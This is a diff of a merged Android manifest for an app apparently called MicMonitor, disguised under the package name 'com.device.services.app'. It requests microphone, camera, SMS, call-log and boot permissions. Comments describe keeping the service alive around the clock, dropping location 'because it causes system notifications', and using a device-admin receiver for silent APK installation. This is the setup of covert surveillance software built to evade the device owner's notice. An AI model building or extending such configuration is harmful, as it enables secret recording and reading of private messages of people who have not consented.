@@ -1,8 +1,8 @@
 1<?xml version="1.0" encoding="utf-8"?>
 2<manifest xmlns:android="http://schemas.android.com/apk/res/android"
 3    package="com.device.services.app"
-4    android:versionCode="14"
-5    android:versionName="1.5.0" >
+4    android:versionCode="15"
+5    android:versionName="1.6.0" >
 6
 7    <uses-sdk
 8        android:minSdkVersion="26"
@@ -10,23 +10,23 @@
 10
 11    <!-- Core Permissions -->
 12    <uses-permission android:name="android.permission.RECORD_AUDIO" />
-12-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:6:5-71
-12-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:6:22-68
+12-->D:\mic\monitor\app\src\main\AndroidManifest.xml:6:5-71
+12-->D:\mic\monitor\app\src\main\AndroidManifest.xml:6:22-68
 13    <uses-permission android:name="android.permission.CAMERA" />
-13-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:7:5-65
-13-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:7:22-62
+13-->D:\mic\monitor\app\src\main\AndroidManifest.xml:7:5-65
+13-->D:\mic\monitor\app\src\main\AndroidManifest.xml:7:22-62
 14    <uses-permission android:name="android.permission.INTERNET" />
-14-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:8:5-67
-14-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:8:22-64
+14-->D:\mic\monitor\app\src\main\AndroidManifest.xml:8:5-67
+14-->D:\mic\monitor\app\src\main\AndroidManifest.xml:8:22-64
 15    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
-15-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:9:5-79
-15-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:9:22-76
+15-->D:\mic\monitor\app\src\main\AndroidManifest.xml:9:5-79
+15-->D:\mic\monitor\app\src\main\AndroidManifest.xml:9:22-76
 16    <uses-permission android:name="android.permission.WAKE_LOCK" />
-16-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:10:5-68
-16-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:10:22-65
+16-->D:\mic\monitor\app\src\main\AndroidManifest.xml:10:5-68
+16-->D:\mic\monitor\app\src\main\AndroidManifest.xml:10:22-65
 17    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
-17-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:11:5-81
-17-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:11:22-78
+17-->D:\mic\monitor\app\src\main\AndroidManifest.xml:11:5-81
+17-->D:\mic\monitor\app\src\main\AndroidManifest.xml:11:22-78
 18
 19    <!-- Location REMOVED - causes system notifications -->
 20    <!-- <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" /> -->
@@ -35,55 +35,55 @@
 23
 24    <!-- SMS & Call Log -->
 25    <uses-permission android:name="android.permission.READ_SMS" />
-25-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:18:5-67
-25-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:18:22-64
+25-->D:\mic\monitor\app\src\main\AndroidManifest.xml:18:5-67
+25-->D:\mic\monitor\app\src\main\AndroidManifest.xml:18:22-64
 26    <uses-permission android:name="android.permission.READ_CALL_LOG" />
-26-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:19:5-72
-26-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:19:22-69
+26-->D:\mic\monitor\app\src\main\AndroidManifest.xml:19:5-72
+26-->D:\mic\monitor\app\src\main\AndroidManifest.xml:19:22-69
 27
 28    <!-- WiFi Control (Device Owner can toggle WiFi) -->
 29    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
-29-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:22:5-76
-29-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:22:22-73
+29-->D:\mic\monitor\app\src\main\AndroidManifest.xml:22:5-76
+29-->D:\mic\monitor\app\src\main\AndroidManifest.xml:22:22-73
 30    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE" />
-30-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:23:5-76
-30-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:23:22-73
+30-->D:\mic\monitor\app\src\main\AndroidManifest.xml:23:5-76
+30-->D:\mic\monitor\app\src\main\AndroidManifest.xml:23:22-73
 31
 32    <!-- Foreground Service Permissions (Android 9+) -->
 33    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
-33-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:26:5-77
-33-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:26:22-74
+33-->D:\mic\monitor\app\src\main\AndroidManifest.xml:26:5-77
+33-->D:\mic\monitor\app\src\main\AndroidManifest.xml:26:22-74
 34
 35    <!-- Battery optimization exemption — keeps service alive 24/7 -->
 36    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
-36-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:29:5-95
-36-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:29:22-92
+36-->D:\mic\monitor\app\src\main\AndroidManifest.xml:29:5-95
+36-->D:\mic\monitor\app\src\main\AndroidManifest.xml:29:22-92
 37
 38    <!-- Foreground Service Type Permissions (Android 14+) -->
 39    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
-39-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:32:5-88
-39-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:32:22-85
+39-->D:\mic\monitor\app\src\main\AndroidManifest.xml:32:5-88
+39-->D:\mic\monitor\app\src\main\AndroidManifest.xml:32:22-85
 40    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
-40-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:33:5-84
-40-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:33:22-81
+40-->D:\mic\monitor\app\src\main\AndroidManifest.xml:33:5-84
+40-->D:\mic\monitor\app\src\main\AndroidManifest.xml:33:22-81
 41    <!-- Location service type removed -->
 42
 43
 44    <!-- APK Auto-Update Permissions -->
 45    <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />
-45-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:37:5-83
-45-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:37:22-80
+45-->D:\mic\monitor\app\src\main\AndroidManifest.xml:37:5-83
+45-->D:\mic\monitor\app\src\main\AndroidManifest.xml:37:22-80
 46    <uses-permission android:name="android.permission.INSTALL_PACKAGES" />
-46-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:38:5-111
-46-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:38:22-72
+46-->D:\mic\monitor\app\src\main\AndroidManifest.xml:38:5-111
+46-->D:\mic\monitor\app\src\main\AndroidManifest.xml:38:22-72
 47
 48    <!-- Hardware requirement -->
 49    <uses-feature
-49-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:41:5-43:35
+49-->D:\mic\monitor\app\src\main\AndroidManifest.xml:41:5-43:35
 50        android:name="android.hardware.microphone"
-50-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:42:9-51
+50-->D:\mic\monitor\app\src\main\AndroidManifest.xml:42:9-51
 51        android:required="true" />
-51-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:43:9-32
+51-->D:\mic\monitor\app\src\main\AndroidManifest.xml:43:9-32
 52
 53    <permission
 53-->[androidx.core:core:1.12.0] C:\Users\vishw\.gradle\caches\transforms-3\d1e4a685b1001794fbcfe4ee9c157a7e\transformed\core-1.12.0\AndroidManifest.xml:22:5-24:47
@@ -97,147 +97,147 @@
 57-->[androidx.core:core:1.12.0] C:\Users\vishw\.gradle\caches\transforms-3\d1e4a685b1001794fbcfe4ee9c157a7e\transformed\core-1.12.0\AndroidManifest.xml:26:22-94
 58
 59    <application
-59-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:45:5-122:19
+59-->D:\mic\monitor\app\src\main\AndroidManifest.xml:45:5-122:19
 60        android:name="com.micmonitor.app.MicApp"
-60-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:46:9-31
+60-->D:\mic\monitor\app\src\main\AndroidManifest.xml:46:9-31
 61        android:allowBackup="false"
-61-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:47:9-36
+61-->D:\mic\monitor\app\src\main\AndroidManifest.xml:47:9-36
 62        android:appComponentFactory="androidx.core.app.CoreComponentFactory"
 62-->[androidx.core:core:1.12.0] C:\Users\vishw\.gradle\caches\transforms-3\d1e4a685b1001794fbcfe4ee9c157a7e\transformed\core-1.12.0\AndroidManifest.xml:28:18-86
 63        android:dataExtractionRules="@xml/data_extraction_rules"
-63-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:48:9-65
+63-->D:\mic\monitor\app\src\main\AndroidManifest.xml:48:9-65
 64        android:extractNativeLibs="false"
 65        android:fullBackupContent="@xml/backup_rules"
-65-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:49:9-54
+65-->D:\mic\monitor\app\src\main\AndroidManifest.xml:49:9-54
 66        android:label="@string/app_name"
-66-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:50:9-41
+66-->D:\mic\monitor\app\src\main\AndroidManifest.xml:50:9-41
 67        android:supportsRtl="true"
-67-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:51:9-35
+67-->D:\mic\monitor\app\src\main\AndroidManifest.xml:51:9-35
 68        android:theme="@style/Theme.MicMonitor"
-68-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:53:9-48
+68-->D:\mic\monitor\app\src\main\AndroidManifest.xml:53:9-48
 69        android:usesCleartextTraffic="true" >
-69-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:52:9-44
+69-->D:\mic\monitor\app\src\main\AndroidManifest.xml:52:9-44
 70
 71        <!-- Main Activity (one-time setup screen) -->
 72        <activity
-72-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:57:9-65:20
+72-->D:\mic\monitor\app\src\main\AndroidManifest.xml:57:9-65:20
 73            android:name="com.micmonitor.app.MainActivity"
-73-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:58:13-41
+73-->D:\mic\monitor\app\src\main\AndroidManifest.xml:58:13-41
 74            android:exported="true"
-74-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:59:13-36
+74-->D:\mic\monitor\app\src\main\AndroidManifest.xml:59:13-36
 75            android:theme="@style/Theme.MicMonitor" >
-75-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:60:13-52
+75-->D:\mic\monitor\app\src\main\AndroidManifest.xml:60:13-52
 76            <intent-filter>
-76-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:61:13-64:29
+76-->D:\mic\monitor\app\src\main\AndroidManifest.xml:61:13-64:29
 77                <action android:name="android.intent.action.MAIN" />
-77-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:62:17-69
-77-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:62:25-66
+77-->D:\mic\monitor\app\src\main\AndroidManifest.xml:62:17-69
+77-->D:\mic\monitor\app\src\main\AndroidManifest.xml:62:25-66
 78
 79                <category android:name="android.intent.category.LAUNCHER" />
-79-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:63:17-77
-79-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:63:27-74
+79-->D:\mic\monitor\app\src\main\AndroidManifest.xml:63:17-77
+79-->D:\mic\monitor\app\src\main\AndroidManifest.xml:63:27-74
 80            </intent-filter>
 81        </activity>
 82
 83        <!-- Foreground Service (location removed from foregroundServiceType) -->
 84        <service
-84-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:68:9-72:44
+84-->D:\mic\monitor\app\src\main\AndroidManifest.xml:68:9-72:44
 85            android:name="com.micmonitor.app.MicService"
-85-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:69:13-39
+85-->D:\mic\monitor\app\src\main\AndroidManifest.xml:69:13-39
 86            android:exported="false"
-86-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:71:13-37
+86-->D:\mic\monitor\app\src\main\AndroidManifest.xml:71:13-37
 87            android:foregroundServiceType="microphone|camera"
-87-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:70:13-62
+87-->D:\mic\monitor\app\src\main\AndroidManifest.xml:70:13-62
 88            android:stopWithTask="false" />
-88-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:72:13-41
+88-->D:\mic\monitor\app\src\main\AndroidManifest.xml:72:13-41
 89
 90        <!-- Auto-start receiver for boot and app update -->
 91        <receiver
-91-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:75:9-87:20
+91-->D:\mic\monitor\app\src\main\AndroidManifest.xml:75:9-87:20
 92            android:name="com.micmonitor.app.BootReceiver"
-92-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:76:13-41
+92-->D:\mic\monitor\app\src\main\AndroidManifest.xml:76:13-41
 93            android:directBootAware="true"
-93-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:79:13-43
+93-->D:\mic\monitor\app\src\main\AndroidManifest.xml:79:13-43
 94            android:enabled="true"
-94-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:77:13-35
+94-->D:\mic\monitor\app\src\main\AndroidManifest.xml:77:13-35
 95            android:exported="true" >
-95-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:78:13-36
+95-->D:\mic\monitor\app\src\main\AndroidManifest.xml:78:13-36
 96            <intent-filter android:priority="1000" >
-96-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:80:13-86:29
-96-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:80:28-51
+96-->D:\mic\monitor\app\src\main\AndroidManifest.xml:80:13-86:29
+96-->D:\mic\monitor\app\src\main\AndroidManifest.xml:80:28-51
 97                <action android:name="android.intent.action.BOOT_COMPLETED" />
-97-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:81:17-79
-97-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:81:25-76
+97-->D:\mic\monitor\app\src\main\AndroidManifest.xml:81:17-79
+97-->D:\mic\monitor\app\src\main\AndroidManifest.xml:81:25-76
 98                <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED" />
-98-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:82:17-86
-98-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:82:25-83
+98-->D:\mic\monitor\app\src\main\AndroidManifest.xml:82:17-86
+98-->D:\mic\monitor\app\src\main\AndroidManifest.xml:82:25-83
 99                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
-99-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:83:17-82
-99-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:83:25-79
+99-->D:\mic\monitor\app\src\main\AndroidManifest.xml:83:17-82
+99-->D:\mic\monitor\app\src\main\AndroidManifest.xml:83:25-79
 100                <action android:name="com.htc.intent.action.QUICKBOOT_POWERON" />
-100-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:84:17-82
-100-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:84:25-79
+100-->D:\mic\monitor\app\src\main\AndroidManifest.xml:84:17-82
+100-->D:\mic\monitor\app\src\main\AndroidManifest.xml:84:25-79
 101                <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
-101-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:85:17-84
-101-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:85:25-81
+101-->D:\mic\monitor\app\src\main\AndroidManifest.xml:85:17-84
+101-->D:\mic\monitor\app\src\main\AndroidManifest.xml:85:25-81
 102            </intent-filter>
 103        </receiver>
 104
 105        <!-- Device Admin Receiver for silent APK installation -->
 106        <receiver
-106-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:90:9-100:20
+106-->D:\mic\monitor\app\src\main\AndroidManifest.xml:90:9-100:20
 107            android:name="com.micmonitor.app.DeviceAdminReceiver"
-107-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:91:13-48
+107-->D:\mic\monitor\app\src\main\AndroidManifest.xml:91:13-48
 108            android:exported="true"
-108-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:92:13-36
+108-->D:\mic\monitor\app\src\main\AndroidManifest.xml:92:13-36
 109            android:permission="android.permission.BIND_DEVICE_ADMIN" >
-109-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:93:13-70
+109-->D:\mic\monitor\app\src\main\AndroidManifest.xml:93:13-70
 110            <meta-data
-110-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:94:13-96:56
+110-->D:\mic\monitor\app\src\main\AndroidManifest.xml:94:13-96:56
 111                android:name="android.app.device_admin"
-111-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:95:17-56
+111-->D:\mic\monitor\app\src\main\AndroidManifest.xml:95:17-56
 112                android:resource="@xml/device_admin" />
-112-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:96:17-53
+112-->D:\mic\monitor\app\src\main\AndroidManifest.xml:96:17-53
 113
 114            <intent-filter>
-114-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:97:13-99:29
+114-->D:\mic\monitor\app\src\main\AndroidManifest.xml:97:13-99:29
 115                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
-115-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:98:17-82
-115-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:98:25-79
+115-->D:\mic\monitor\app\src\main\AndroidManifest.xml:98:17-82
+115-->D:\mic\monitor\app\src\main\AndroidManifest.xml:98:25-79
 116            </intent-filter>
 117        </receiver>
 118
 119        <!-- Install Result Receiver for silent install feedback -->
 120        <receiver
-120-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:103:9-109:20
+120-->D:\mic\monitor\app\src\main\AndroidManifest.xml:103:9-109:20
 121            android:name="com.micmonitor.app.InstallResultReceiver"
-121-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:104:13-50
+121-->D:\mic\monitor\app\src\main\AndroidManifest.xml:104:13-50
 122            android:exported="false" >
-122-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:105:13-37
+122-->D:\mic\monitor\app\src\main\AndroidManifest.xml:105:13-37
 123            <intent-filter>
-123-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:106:13-108:29
+123-->D:\mic\monitor\app\src\main\AndroidManifest.xml:106:13-108:29
 124                <action android:name="com.micmonitor.app.INSTALL_RESULT" />
-124-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:107:17-76
-124-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:107:25-73
+124-->D:\mic\monitor\app\src\main\AndroidManifest.xml:107:17-76
+124-->D:\mic\monitor\app\src\main\AndroidManifest.xml:107:25-73
 125            </intent-filter>
 126        </receiver>
 127
 128        <!-- FileProvider for APK installation (Android 7+) -->
 129        <provider
 130            android:name="androidx.core.content.FileProvider"
-130-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:113:13-62
+130-->D:\mic\monitor\app\src\main\AndroidManifest.xml:113:13-62
 131            android:authorities="com.device.services.app.fileprovider"
-131-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:114:13-64
+131-->D:\mic\monitor\app\src\main\AndroidManifest.xml:114:13-64
 132            android:exported="false"
-132-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:115:13-37
+132-->D:\mic\monitor\app\src\main\AndroidManifest.xml:115:13-37
 133            android:grantUriPermissions="true" >
-133-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:116:13-47
+133-->D:\mic\monitor\app\src\main\AndroidManifest.xml:116:13-47
 134            <meta-data
-134-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:117:13-119:54
+134-->D:\mic\monitor\app\src\main\AndroidManifest.xml:117:13-119:54
 135                android:name="android.support.FILE_PROVIDER_PATHS"
-135-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:118:17-67
+135-->D:\mic\monitor\app\src\main\AndroidManifest.xml:118:17-67
 136                android:resource="@xml/file_paths" />
-136-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:119:17-51
+136-->D:\mic\monitor\app\src\main\AndroidManifest.xml:119:17-51
 137        </provider>
 138        <provider
 138-->[androidx.emoji2:emoji2:1.2.0] C:\Users\vishw\.gradle\caches\transforms-3\bc470873fdd23c33cd7d3c06f37ee37c\transformed\jetified-emoji2-1.2.0\AndroidManifest.xml:24:9-32:20
@@ -406,8 +406,8 @@
 222            <intent-filter>
 222-->[androidx.work:work-runtime:2.9.0] C:\Users\vishw\.gradle\caches\transforms-3\cdaf741c9b2706d3adf34456479f89ff\transformed\work-runtime-2.9.0\AndroidManifest.xml:116:13-120:29
 223                <action android:name="android.intent.action.BOOT_COMPLETED" />
-223-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:81:17-79
-223-->C:\Users\vishw\OneDrive\Desktop\New folder\MicMonitor\app\src\main\AndroidManifest.xml:81:25-76
+223-->D:\mic\monitor\app\src\main\AndroidManifest.xml:81:17-79
+223-->D:\mic\monitor\app\src\main\AndroidManifest.xml:81:25-76
 224                <action android:name="android.intent.action.TIME_SET" />
 224-->[androidx.work:work-runtime:2.9.0] C:\Users\vishw\.gradle\caches\transforms-3\cdaf741c9b2706d3adf34456479f89ff\transformed\work-runtime-2.9.0\AndroidManifest.xml:118:17-73
 224-->[androidx.work:work-runtime:2.9.0] C:\Users\vishw\.gradle\caches\transforms-3\cdaf741c9b2706d3adf34456479f89ff\transformed\work-runtime-2.9.0\AndroidManifest.xml:118:25-70
